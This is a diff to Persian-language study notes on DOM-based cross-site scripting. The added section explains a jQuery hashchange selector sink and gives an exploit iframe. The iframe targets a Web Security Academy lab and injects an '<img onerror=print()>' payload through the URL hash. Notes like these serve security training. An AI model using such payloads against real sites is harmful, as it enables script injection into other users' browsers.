@@ -35,7 +35,19 @@ $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('r
 ...
 <a id="backLink">Back</a>
 ```
-- ییی
+- رخداد ```hashchange``` و ```jQuery selector``` برای *sink*
+  - طبق کد زیر، وبلاگ پس از لود شدن، بطور خودکار به شماره پستی که پس از علامت ```#``` درون URL نوشته شده است، می رود.
+  - برای بهره برداری از این آسیب پذیری، از iframe نمایش داده شده استفاده می کنیم.
+```Javascript
+$(window).on('hashchange', function(){
+                            var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
+                            if (post) post.get(0).scrollIntoView();
+                        });
+```
+```Javascript
+<iframe src="https://ac321f2a1f028348c0ab3eba003000ff.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe> 
+```
+- سی
 
 ## Payloads
 ```Javascript
